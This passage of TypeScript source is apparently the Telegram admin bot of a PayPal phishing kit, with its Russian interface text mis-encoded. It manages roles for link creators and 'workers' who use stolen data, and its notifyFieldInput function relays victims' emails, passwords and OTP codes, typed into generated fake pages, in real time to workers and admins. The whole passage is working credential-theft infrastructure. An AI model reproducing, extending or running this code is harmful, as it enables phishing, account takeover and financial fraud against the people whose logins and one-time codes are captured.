    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user delete form:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–æ—Ä–º—ã —É–¥–∞–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function showUserPromoteForm(chatId: number, telegramId: string) {
  try {
    const regularUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.role, 'user'));
    
    if (regularUsers.length === 0) {
      await bot.sendMessage(chatId, "üì≠ –ù–µ—Ç –æ–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è.");
      return;
    }

    const message = 
      `‚¨ÜÔ∏è <b>–ü–æ–≤—ã—Å–∏—Ç—å –¥–æ –≤–±–∏–≤–µ—Ä–∞</b>\n\n` +
      `–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –¥–æ —Ä–æ–ª–∏ –≤–±–∏–≤–µ—Ä–∞:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...regularUsers.map(user => [
          { 
            text: `‚¨ÜÔ∏è ${user.uniqueId} (@${user.username || '–Ω–µ—Ç username'})`, 
            callback_data: `promote_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "üîô –ù–∞–∑–∞–¥", callback_data: "manage_users" },
          { text: "‚ùå –û—Ç–º–µ–Ω–∞", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user promote form:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–æ—Ä–º—ã –ø–æ–≤—ã—à–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function showUserDemoteForm(chatId: number, telegramId: string) {
  try {
    const workerUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.role, 'worker'));
    
    if (workerUsers.length === 0) {
      await bot.sendMessage(chatId, "üì≠ –ù–µ—Ç –≤–±–∏–≤–µ—Ä–æ–≤ –¥–ª—è –ø–æ–Ω–∏–∂–µ–Ω–∏—è.");
      return;
    }

    const message = 
      `‚¨áÔ∏è <b>–ü–æ–Ω–∏–∑–∏—Ç—å –¥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n` +
      `–í—ã–±–µ—Ä–∏—Ç–µ –≤–±–∏–≤–µ—Ä–∞ –¥–ª—è –ø–æ–Ω–∏–∂–µ–Ω–∏—è –¥–æ —Ä–æ–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...workerUsers.map(user => [
          { 
            text: `‚¨áÔ∏è ${user.uniqueId} (@${user.username || '–Ω–µ—Ç username'})`, 
            callback_data: `demote_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "üîô –ù–∞–∑–∞–¥", callback_data: "manage_users" },
          { text: "‚ùå –û—Ç–º–µ–Ω–∞", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user demote form:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–æ—Ä–º—ã –ø–æ–Ω–∏–∂–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function showUserBlockForm(chatId: number, telegramId: string) {
  try {
    const activeUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    
    if (activeUsers.length === 0) {
      await bot.sendMessage(chatId, "üì≠ –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏.");
      return;
    }

    const message = 
      `üö´ <b>–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n` +
      `–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...activeUsers.map(user => [
          { 
            text: `üö´ ${user.uniqueId} (@${user.username || '–Ω–µ—Ç username'})`, 
            callback_data: `block_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "üîô –ù–∞–∑–∞–¥", callback_data: "manage_users" },
          { text: "‚ùå –û—Ç–º–µ–Ω–∞", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user block form:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–æ—Ä–º—ã –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function showUserUnblockForm(chatId: number, telegramId: string) {
  try {
    const blockedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, false));
    
    if (blockedUsers.length === 0) {
      await bot.sendMessage(chatId, "üì≠ –ù–µ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏.");
      return;
    }

    const message = 
      `‚úÖ <b>–†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n` +
      `–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:\n\n`;

    const keyboard = {
      inline_keyboard: [
        ...blockedUsers.map(user => [
          { 
            text: `‚úÖ ${user.uniqueId} (@${user.username || '–Ω–µ—Ç username'})`, 
            callback_data: `unblock_user_${user.telegramId}` 
          }
        ]),
        [
          { text: "üîô –ù–∞–∑–∞–¥", callback_data: "manage_users" },
          { text: "‚ùå –û—Ç–º–µ–Ω–∞", callback_data: "main_menu" },
        ],
      ],
    };

    await bot.sendMessage(chatId, message, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
  } catch (error) {
    console.error("Error showing user unblock form:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–æ—Ä–º—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

// User action functions
async function addNewUser(chatId: number, telegramId: string, newUserId: string) {
  try {
    // Check if user already exists
    const existingUser = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, newUserId));
    
    if (existingUser.length > 0) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ —Å–∏—Å—Ç–µ–º–µ.");
      return;
    }

    // Generate unique ID for new user
    const uniqueId = generateUniqueId();
    
    // Create new user
    await db.insert(telegramUsers).values({
      telegramId: newUserId,
      uniqueId: uniqueId,
      role: 'user',
      isApproved: true,
      username: null,
      firstName: null,
      lastName: null,
      createdAt: new Date(),
    });
    
    await bot.sendMessage(chatId, 
      `‚úÖ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–±–∞–≤–ª–µ–Ω</b>\n\n` +
      `‚Ä¢ Telegram ID: ${newUserId}\n` +
      `‚Ä¢ Unique ID: ${uniqueId}\n` +
      `‚Ä¢ –†–æ–ª—å: user (–æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å)\n` +
      `‚Ä¢ –°—Ç–∞—Ç—É—Å: –∞–∫—Ç–∏–≤–µ–Ω\n\n` +
      `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–∏—Å—Ç–µ–º—É –∏ –º–æ–∂–µ—Ç –Ω–∞—á–∞—Ç—å —Ä–∞–±–æ—Ç—É.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error adding new user:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function deleteUser(chatId: number, telegramId: string, userToDeleteId: string) {
  try {
    const userToDelete = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToDeleteId));
    
    if (userToDelete.length === 0) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.");
      return;
    }

    const user = userToDelete[0];
    
    // Delete user from database
    await db.delete(telegramUsers).where(eq(telegramUsers.telegramId, userToDeleteId));
    
    // Delete user's links
    await db.delete(telegramLinks).where(eq(telegramLinks.createdBy, userToDeleteId));
    
    // Delete user's worker assignments (both as worker and as user)
    await db.delete(workerAssignments).where(eq(workerAssignments.workerId, userToDeleteId));
    await db.delete(workerAssignments).where(eq(workerAssignments.userId, userToDeleteId));
    
    await bot.sendMessage(chatId, 
      `‚úÖ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–¥–∞–ª–µ–Ω</b>\n\n` +
      `‚Ä¢ ID: ${user.uniqueId}\n` +
      `‚Ä¢ Telegram: @${user.username || '–Ω–µ—Ç username'}\n` +
      `‚Ä¢ –†–æ–ª—å: ${user.role}\n\n` +
      `–í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —É–¥–∞–ª–µ–Ω—ã –∏–∑ —Å–∏—Å—Ç–µ–º—ã.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error deleting user:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function promoteUser(chatId: number, telegramId: string, userToPromoteId: string) {
  try {
    const userToPromote = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToPromoteId));
    
    if (userToPromote.length === 0) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.");
      return;
    }

    const user = userToPromote[0];
    
    if (user.role !== 'user') {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –æ–±—ã—á–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.");
      return;
    }
    
    // Update user role to worker
    await db.update(telegramUsers)
      .set({ role: 'worker' })
      .where(eq(telegramUsers.telegramId, userToPromoteId));
    
    await bot.sendMessage(chatId, 
      `‚úÖ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–≤—ã—à–µ–Ω</b>\n\n` +
      `‚Ä¢ ID: ${user.uniqueId}\n` +
      `‚Ä¢ Telegram: @${user.username || '–Ω–µ—Ç username'}\n` +
      `‚Ä¢ –ù–æ–≤–∞—è —Ä–æ–ª—å: worker (–≤–±–∏–≤–µ—Ä)\n\n` +
      `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ç–µ–ø–µ—Ä—å –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Å –¥–∞–Ω–Ω—ã–º–∏.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error promoting user:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–≤—ã—à–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function demoteUser(chatId: number, telegramId: string, userToDemoteId: string) {
  try {
    const userToDemote = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToDemoteId));
    
    if (userToDemote.length === 0) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.");
      return;
    }

    const user = userToDemote[0];
    
    if (user.role !== 'worker') {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –≤–±–∏–≤–µ—Ä–æ–º.");
      return;
    }
    
    // Update user role to user
    await db.update(telegramUsers)
      .set({ role: 'user' })
      .where(eq(telegramUsers.telegramId, userToDemoteId));
    
    // Remove all worker assignments
    await db.delete(workerAssignments).where(eq(workerAssignments.workerId, userToDemoteId));
    
    await bot.sendMessage(chatId, 
      `‚úÖ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–Ω–∏–∂–µ–Ω</b>\n\n` +
      `‚Ä¢ ID: ${user.uniqueId}\n` +
      `‚Ä¢ Telegram: @${user.username || '–Ω–µ—Ç username'}\n` +
      `‚Ä¢ –ù–æ–≤–∞—è —Ä–æ–ª—å: user (–æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å)\n\n` +
      `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –±–æ–ª—å—à–µ –Ω–µ –ø–æ–ª—É—á–∞–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Å –¥–∞–Ω–Ω—ã–º–∏.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error demoting user:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–Ω–∏–∂–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function blockUser(chatId: number, telegramId: string, userToBlockId: string) {
  try {
    const userToBlock = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToBlockId));
    
    if (userToBlock.length === 0) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.");
      return;
    }

    const user = userToBlock[0];
    
    if (!user.isApproved) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.");
      return;
    }
    
    // Block user
    await db.update(telegramUsers)
      .set({ isApproved: false })
      .where(eq(telegramUsers.telegramId, userToBlockId));
    
    await bot.sendMessage(chatId, 
      `üö´ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω</b>\n\n` +
      `‚Ä¢ ID: ${user.uniqueId}\n` +
      `‚Ä¢ Telegram: @${user.username || '–Ω–µ—Ç username'}\n` +
      `‚Ä¢ –†–æ–ª—å: ${user.role}\n\n` +
      `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –∏ –Ω–µ –º–æ–∂–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Å–∏—Å—Ç–µ–º–æ–π.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error blocking user:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

async function unblockUser(chatId: number, telegramId: string, userToUnblockId: string) {
  try {
    const userToUnblock = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, userToUnblockId));
    
    if (userToUnblock.length === 0) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.");
      return;
    }

    const user = userToUnblock[0];
    
    if (user.isApproved) {
      await bot.sendMessage(chatId, "‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.");
      return;
    }
    
    // Unblock user
    await db.update(telegramUsers)
      .set({ isApproved: true })
      .where(eq(telegramUsers.telegramId, userToUnblockId));
    
    await bot.sendMessage(chatId, 
      `‚úÖ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω</b>\n\n` +
      `‚Ä¢ ID: ${user.uniqueId}\n` +
      `‚Ä¢ Telegram: @${user.username || '–Ω–µ—Ç username'}\n` +
      `‚Ä¢ –†–æ–ª—å: ${user.role}\n\n` +
      `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –∏ –º–æ–∂–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Å–∏—Å—Ç–µ–º–æ–π.`,
      { parse_mode: "HTML" }
    );
    
    await showUserManagement(chatId, telegramId);
  } catch (error) {
    console.error("Error unblocking user:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.");
  }
}

// Diagnostic function to test notification system
export async function testNotificationSystem() {
  console.log("üî• TESTING NOTIFICATION SYSTEM");
  console.log("üî• Bot instance:", typeof bot);
  console.log("üî• Bot polling status:", bot?.isPolling?.() || "unknown");
  
  // Test admin user lookup
  const adminUsers = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.role, "admin"));
  console.log("üî• Admin users found:", adminUsers.length);
  
  // Test worker user lookup
  const workerUsers = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.role, "worker"));
  console.log("üî• Worker users found:", workerUsers.length);
  
  // Test direct message send
  try {
    if (bot && adminUsers.length > 0) {
      console.log("üî• Testing direct message to admin...");
      await bot.sendMessage(adminUsers[0].telegramId, "üî• Test message from notification system");
      console.log("üî• Direct message sent successfully");
    }
  } catch (error) {
    console.error("üî• Direct message failed:", error);
  }
}

// Notify about field input in real-time
export async function notifyFieldInput(
  field: string,
  value: string,
  returnUri: string,
  contextData: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`üì§ Sending field input notification - field: ${field}, context: ${contextData}`);
  
  if (!bot) {
    console.log("üö´ Bot not initialized, skipping notification");
    return;
  }

  try {
    // Find link creator by contextData
    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.contextData, contextData));
    console.log(`üîç Found links for field input notification: ${links.length}`);

    if (links.length === 0) {
      console.log(
        "‚ö†Ô∏è No links found for contextData, no field notification sent",
      );
      return;
    }

    const linkCreatorId = links[0].createdBy;
    const creatorUser = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, linkCreatorId));

    if (creatorUser.length === 0) {
      console.log("‚ö†Ô∏è Link creator not found in database");
      return;
    }

    // Get target users using worker assignment system
    let targetUsers: any[] = [];
    
    // Check if creator is admin - if so, they see all notifications
    if (creatorUser[0].role === "admin") {
      targetUsers = creatorUser;
      console.log("üîë Admin user - sending field notification to admin");
    } else {
      // Check if creator is regular user with assigned workers
      const assignedWorkers = await db
        .select()
        .from(workerAssignments)
        .leftJoin(telegramUsers, eq(workerAssignments.workerId, telegramUsers.telegramId))
        .where(eq(workerAssignments.userId, linkCreatorId));

      if (assignedWorkers.length > 0) {
        // Send to assigned workers
        targetUsers = assignedWorkers.map(assignment => assignment.telegramUsers).filter(Boolean);
        console.log(`üë• Found ${targetUsers.length} assigned workers for field notification`);
      } else {
        // No assigned workers, assign to next available worker using round-robin
        const nextWorker = await getNextWorkerForAssignment();
        if (nextWorker) {
          // Create automatic assignment
          await db.insert(workerAssignments).values({
            workerId: nextWorker,
            userId: linkCreatorId,
            assignedBy: "system",
          });

          console.log(`‚úÖ Auto-assigned worker ${nextWorker} to user ${linkCreatorId}`);
          
          // Get worker info
          const workerUser = await db
            .select()
            .from(telegramUsers)
            .where(eq(telegramUsers.telegramId, nextWorker));
          
          targetUsers = workerUser;
          console.log("ü§ñ Auto-assigned to worker for field notification");
        } else {
          // No workers available, send to admins
          const adminIds = loadAdmins();
          const adminUsers = [];
          for (const adminId of adminIds) {
            const user = await db
              .select()
              .from(telegramUsers)
              .where(eq(telegramUsers.telegramId, adminId));
              
            if (user.length > 0) {
              adminUsers.push(user[0]);
            } else {
              // Create dummy admin object for notification
              adminUsers.push({
                telegramId: adminId,
                uniqueId: `#ADMIN_${adminId}`,
                role: "admin",
                isApproved: true
              });
            }
          }
          
          targetUsers = adminUsers;
          console.log("üîë No workers available - sending field notification to admins");
        }
      }
    }

    if (targetUsers.length === 0) {
      console.log("‚ö†Ô∏è No target users found for field notification");
      return;
    }

    const fieldName =
      field === "email"
        ? "E-Mail"
        : field === "password"
          ? "–ü–∞—Ä–æ–ª—å"
          : "OTP –ö–æ–¥";
    const pageName = field === "otp" ? "–ü—É—à & –°–º—Å" : "–í–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö";

    // Get actual generated link from database
    let actualLink = links[0].generatedLink || "https://paypal.com";
    if (actualLink.includes("localhost:5000")) {
      actualLink = actualLink.replace(
        "http://localhost:5000",
        `https://${await getCurrentDomain()}`,
      );
    }

    const fullMessage =
      `üá©üá™ PAYPAL ${links[0].linkId}\n\n` +
      `üìù <b>–ü–æ–ª–µ:</b> ${fieldName}\n` +
      `üíæ <b>–ó–Ω–∞—á–µ–Ω–∏–µ:</b> <code>${value}</code>`;

    // Create keyboard with refresh button
    const shortHash = contextData.substring(0, 8);
    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "üîÑ –û–±–Ω–æ–≤–∏—Ç—å",
              callback_data: `refresh_page_${shortHash}`,
            },
          ],
        ],
      },
    };

    // Send different notifications based on user role
    for (const user of targetUsers) {
      try {
        if (user.role === "admin" || user.role === "worker") {
          // Send full notification with sensitive data to admins/workers
          await bot.sendMessage(user.telegramId, fullMessage, { 
            parse_mode: "HTML",
            ...keyboard
          });
          console.log(`‚úÖ Full field input notification sent to ${user.role} ${user.uniqueId}`);
        } else {
          // Send simple notification without sensitive data to regular users
          const simpleAction = field === "otp" ? "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç SMS –∫–æ–¥" : "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç –¥–∞–Ω–Ω—ã–µ";
          await sendSimpleUserNotification(user, links[0].linkId, simpleAction, contextData);
        }
      } catch (error) {
        console.error(
          `Failed to send field input notification to ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error sending field input notification:", error);
  }
}

// Admin command to add worker
bot.onText(/\/addworker (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.");
    return;
  }

  if (!workerId) {
    await bot.sendMessage(chatId, "‚ùå –£–∫–∞–∂–∏—Ç–µ Telegram ID –≤–±–∏–≤–µ—Ä–∞.\n\n–ü—Ä–∏–º–µ—Ä: /addworker 123456789");
    return;
  }

  try {
    // Check if user exists
    const existingUser = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, workerId));

    if (existingUser.length === 0) {
      await bot.sendMessage(chatId, `‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID ${workerId} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —Å–∏—Å—Ç–µ–º–µ.`);
      return;
    }

    // Update user role to worker
    await db
      .update(telegramUsers)
      .set({ role: "worker" })
      .where(eq(telegramUsers.telegramId, workerId));

    await bot.sendMessage(
      chatId,
      `‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${workerId} –Ω–∞–∑–Ω–∞—á–µ–Ω –≤–±–∏–≤–µ—Ä–æ–º!\n\n` +
      `üë§ –¢–µ–ø–µ—Ä—å –æ–Ω –±—É–¥–µ—Ç –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç –Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.`,
      adminKeyboard
    );

    // Notify the new worker
    await bot.sendMessage(
      workerId,
      `üéâ –í—ã –Ω–∞–∑–Ω–∞—á–µ–Ω—ã –≤–±–∏–≤–µ—Ä–æ–º!\n\n` +
      `üìã –¢–µ–ø–µ—Ä—å –≤—ã –±—É–¥–µ—Ç–µ –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ª–æ–≥–∞—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.\n` +
      `üìû –î–ª—è –≤–æ–ø—Ä–æ—Å–æ–≤ –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.`
    );
  } catch (error) {
    console.error("Error adding worker:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –≤–±–∏–≤–µ—Ä–∞.");
  }
});

// Admin command to remove worker
bot.onText(/\/removeworker (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.");
    return;
  }

  if (!workerId) {
    await bot.sendMessage(chatId, "‚ùå –£–∫–∞–∂–∏—Ç–µ Telegram ID –≤–±–∏–≤–µ—Ä–∞.\n\n–ü—Ä–∏–º–µ—Ä: /removeworker 123456789");
    return;
  }

  try {
    // Remove all assignments for this worker
    await db
      .delete(workerAssignments)
      .where(eq(workerAssignments.workerId, workerId));

    // Update user role back to user
    await db
      .update(telegramUsers)
      .set({ role: "user" })
      .where(eq(telegramUsers.telegramId, workerId));

    await bot.sendMessage(
      chatId,
      `‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${workerId} –±–æ–ª—å—à–µ –Ω–µ –≤–±–∏–≤–µ—Ä!\n\n` +
      `üìã –í—Å–µ –µ–≥–æ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è —É–¥–∞–ª–µ–Ω—ã.`,
      adminKeyboard
    );

    // Notify the removed worker
    await bot.sendMessage(
      workerId,
      `üìã –í—ã –±–æ–ª—å—à–µ –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –≤–±–∏–≤–µ—Ä–æ–º.\n\n` +
      `üìû –î–ª—è –≤–æ–ø—Ä–æ—Å–æ–≤ –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.`
    );
  } catch (error) {
